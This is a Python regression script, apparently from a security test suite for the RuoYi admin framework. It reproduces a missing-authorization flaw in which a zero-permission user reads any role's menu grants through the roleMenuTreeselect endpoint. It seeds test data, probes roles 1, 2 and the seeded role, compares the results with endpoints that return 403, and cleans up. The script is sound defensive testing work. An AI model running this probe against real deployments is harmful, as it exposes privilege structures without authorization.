#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A20 复现：roleMenuTreeselect 无鉴权注解——零权限登录用户可读取任意角色的完整菜单授权结构。
API 轨（对照腿：角色详情/列表/菜单列表均 403）。造数现场现造用后清理。"""
import json
import os
import sys
import time

sys.path.insert(0, "/home/irons/dev/ruoyi-regression")
sys.path.insert(0, "/home/irons/dev/ruoyi-regression/exec")
import api  # noqa: E402
from contract_lib import (ensure_role, delete_role, ensure_user, delete_user,  # noqa: E402
                          user_token)

OUT = os.environ.get("TCMS_ARTIFACT_DIR", os.path.dirname(os.path.abspath(__file__)))


def find_menu(tok, name):
    _, payload = api.get("/system/menu/list", token=tok, params={"menuName": name})
    rows = [r for r in (payload.get("data") or []) if r["menuName"] == name]
    return rows[0] if rows else None


def main():
    ev = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S")}
    tok = api.admin_token()

    # ---- seed：两个新菜单 + 目标角色(挂两菜单) + 零菜单角色 + 低权用户 ----
    menu_ids = []
    for tag in ("a20mA", "a20mB"):
        _, r = api.post("/system/menu", token=tok, body={
            "parentId": 0, "menuName": tag, "orderNum": 1, "path": tag,
            "component": "system/test/index", "menuType": "C", "visible": "0",
            "status": "0", "perms": "", "icon": "#", "isFrame": "1", "isCache": "0"})
        assert r.get("code") == 200, (tag, r)
        row = find_menu(tok, tag)
        menu_ids.append(row["menuId"])
    tr_id, _ = ensure_role("a20tgt", menu_ids=menu_ids)
    low_id, _ = ensure_role("a20low")
    u_id, uname = ensure_user("a20lowu", role_ids=[low_id])
    ev["seed"] = {"menu_ids": menu_ids, "target_role_id": tr_id,
                  "low_user": uname, "low_role_menu_count": 0}

    # ---- 低权视角 ----
    ltok = user_token(uname)
    _, gi = api.get("/getInfo", token=ltok)
    ev["low_user"] = {"permissions": gi.get("permissions"),
                      "roles": [r.get("roleKey") for r in (gi.get("user") or {}).get("roles") or []]}

    _, r1 = api.get("/system/menu/roleMenuTreeselect/%s" % tr_id, token=ltok)
    ev["leak_own_role"] = {"code": r1.get("code"),
                           "checkedKeys": sorted(r1.get("checkedKeys") or []),
                           "expected_leaked": sorted(menu_ids),
                           "menus_visible_to_caller": len(r1.get("menus") or [])}
    _, r2 = api.get("/system/menu/roleMenuTreeselect/2", token=ltok)
    ev["leak_seed_role2"] = {"code": r2.get("code"),
                             "checkedKeys_count": len(r2.get("checkedKeys") or [])}
    _, r3 = api.get("/system/menu/roleMenuTreeselect/1", token=ltok)
    ev["leak_seed_role1"] = {"code": r3.get("code"),
                             "checkedKeys_count": len(r3.get("checkedKeys") or [])}

    # ---- 对照腿（同数据域均有防线）----
    ev["contrast"] = {}
    for name, url in (("role_detail", "/system/role/%s" % tr_id),
                      ("role_list", "/system/role/list"),
                      ("menu_list", "/system/menu/list"),
                      ("menu_treeselect_self", "/system/menu/treeselect")):
        _, rr = api.get(url, token=ltok)
        ev["contrast"][name] = rr.get("code")

    # ---- cleanup ----
    delete_user(u_id)
    delete_role(low_id)
    delete_role(tr_id)
    for mid in menu_ids:
        api.delete("/system/menu/%s" % mid, token=tok)
    _, p = api.get("/system/menu/list", token=tok, params={"menuName": "a20m"})
    ev["cleanup"] = {"menu_remaining": len(p.get("data") or []),
                     "role_remaining": len(api.db(
                         "SELECT 1 FROM sys_role WHERE role_id IN (%s,%s) AND del_flag='0'",
                         (tr_id, low_id))),
                     "user_remaining": len(api.db(
                         "SELECT 1 FROM sys_user WHERE user_id=%s AND del_flag='0'", (u_id,)))}

    with open(os.path.join(OUT, "a20_evidence.json"), "w", encoding="utf-8") as f:
        json.dump(ev, f, ensure_ascii=False, indent=1)
    print(json.dumps(ev, ensure_ascii=False, indent=1))


if __name__ == "__main__":
    main()
